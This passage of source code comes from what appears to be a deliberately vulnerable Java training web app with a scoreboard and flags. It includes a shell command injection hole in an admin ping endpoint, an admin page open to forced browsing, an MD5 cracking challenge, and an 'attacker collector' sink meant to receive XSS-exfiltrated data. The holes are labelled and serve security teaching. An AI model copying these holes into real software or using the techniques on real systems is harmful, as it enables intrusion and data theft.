                + "honest verdict. A quick wordlist is run against the fast hashes.</p>"
                + "<form method=post class=row><input name=pw value=\"" + h(pw) + "\"><button>Hash it</button></form>"
                + "<table class=fixed><tr><th>Scheme</th><th>Stored value</th><th>Verdict</th></tr>" + tr + "</table>"
                + "<p class=muted><span class=\"pill no\">red</span> broken &middot; "
                + "<span class=\"pill warn\">amber</span> weak (fast, brute-forceable) &middot; "
                + "<span class=\"pill ok\">green</span> use this (salted + slow). Fix the app to store "
                + "with Argon2id.</p></div>"
                + "<div class=card><h3>Challenge: crack the leaked hash</h3>"
                + "<p>A breach dumped this unsalted MD5. Recover the plaintext and submit it.</p>"
                + "<p><code>" + CRACK_TARGET + "</code></p>"
                + "<form method=post class=row><input type=hidden name=pw value=\"" + h(pw) + "\">"
                + "<input name=plain placeholder=\"plaintext\"><button>Submit</button></form>" + result + "</div>");
        };
        app.get("/storage", storage);
        app.post("/storage", storage);

        // ---- admin: forced browsing ---------------------------------------- //
        app.get("/admin", ctx -> {
            var u = requireUser(ctx);
            if (u == null) return;
            // VULN (A01): reachable by anyone who knows the URL; only hidden from the menu.
            if (!"admin".equals(u.get("role"))) {
                solve("forced_admin");
            }
            page(ctx, "<div class=card><h2>Admin panel</h2>"
                + "<p class=muted>Admin-only area. (Solving is detected server-side; see the scoreboard.)</p>"
                + "<h3>Network diagnostics</h3>"
                + "<form action=/admin/ping class=grid><input name=host value=127.0.0.1>"
                + "<div><button>Ping</button></div></form></div>");
        });

        app.get("/admin/ping", ctx -> {
            if (requireUser(ctx) == null) return;
            String host = ctx.queryParam("host") == null ? "127.0.0.1" : ctx.queryParam("host");
            // VULN (A05): user input in a shell command string.
            Process proc = new ProcessBuilder("sh", "-c", "ping -c1 " + host).redirectErrorStream(true).start();
            String combined;
            try (var in = proc.getInputStream()) {
                combined = new String(in.readAllBytes(), java.nio.charset.StandardCharsets.UTF_8);
            }
            proc.waitFor();
            if (combined.contains("FLAG{os_command_injection_rce}")) solve("cmdi");
            page(ctx, "<div class=card><h2>Diagnostics</h2><pre>" + h(combined) + "</pre></div>");
        });

        // ---- attacker collector (XSS exfil sink) --------------------------- //
        app.get("/collector", ctx -> {
            String c = param(ctx.queryParam("c"));
            if (!c.isEmpty()) exec("INSERT INTO collector(ts,data) VALUES(?,?)", now(), c);
            ctx.contentType("image/gif").result("");
        });

        app.get("/collector/log", ctx -> {
            StringBuilder pre = new StringBuilder();
            for (var r : query("SELECT ts,data FROM collector ORDER BY id DESC"))
                pre.append("<pre>").append(h(r.get("data"))).append("</pre>");
            page(ctx, "<div class=card><h2>Collector &mdash; received data</h2>"
                + "<p class=muted>Your exfiltration sink. Point XSS payloads here.</p>"
                + (pre.length() == 0 ? "<p>nothing yet</p>" : pre) + "</div>");
        });

        // ---- scoreboard ---------------------------------------------------- //
        app.get("/scoreboard", ctx -> {
            Set<String> done = solvedIds();
            StringBuilder tr = new StringBuilder();
            for (Challenge c : CHALLENGES) {
                boolean ok = done.contains(c.id());
                StringBuilder hints = new StringBuilder();
                for (String hint : c.hints()) hints.append("<li>").append(h(hint)).append("</li>");
                tr.append("<tr class=\"").append(ok ? "ok" : "").append("\">")
                  .append("<td>").append(c.cat()).append("</td>")
                  .append("<td><b>").append(h(c.title())).append("</b><br><small class=muted>")
                  .append(h(c.goal())).append("</small></td>")
                  .append("<td>").append(c.diff()).append("</td>")
                  .append("<td>").append(ok ? "<span class=\"pill ok\">SOLVED</span>" : "<span class=\"pill no\">open</span>")
                  .append("</td><td><details><summary>hints</summary><ol>").append(hints).append("</ol></details>");
                // Flags + fix notes are revealed only after a solve.
                if (ok) tr.append("<span class=flag>").append(h(c.flag())).append("</span><br><small class=muted>Fix: ")
                          .append(h(c.fix())).append("</small>");
                tr.append("</td></tr>");
            }
            page(ctx, "<div class=card><h2>Scoreboard</h2><p>" + done.size() + " / " + CHALLENGES.size()
                + " solved.</p><table><tr><th>OWASP</th><th>Challenge</th><th>Diff</th><th>Status</th>"
                + "<th>Hints / Flag / Fix</th></tr>" + tr + "</table></div>");
        });

        app.start("0.0.0.0", 7000);
        Thread bot = new Thread(Main::adminBot, "admin-bot");
        bot.setDaemon(true);
        bot.start();
    }
}
